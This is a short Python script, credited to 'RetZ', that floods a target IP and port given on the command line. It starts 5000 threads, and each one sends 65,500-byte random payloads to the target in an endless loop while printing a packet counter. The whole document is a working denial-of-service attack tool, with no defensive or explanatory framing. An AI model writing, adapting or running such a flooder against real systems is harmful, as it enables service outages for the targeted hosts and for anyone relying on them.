import random
import socket
import threading
import os, sys

os.system("clear")
print('''\033[1;31;40m
Code By RetZ.
''')

ip = str(sys.argv[1])
port = int(sys.argv[2])
times = int("1000")
threads = int("5000")
def udp():
  data = random._urandom(65500)
  pack = 0
  while True:
    try:
      sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

      addr = (str(ip),int(port))
      sock.connect((ip,port))
      for x in range(times):
       sock.sendto(data,addr)
       sock.send(data)
      pack += 1
      print(f"\033[91mSend Packets To %s:%s ==> %s"%(ip,port,pack))
    except:
      pass

for y in range(threads):
  th = threading.Thread(target = udp)
  th.start()
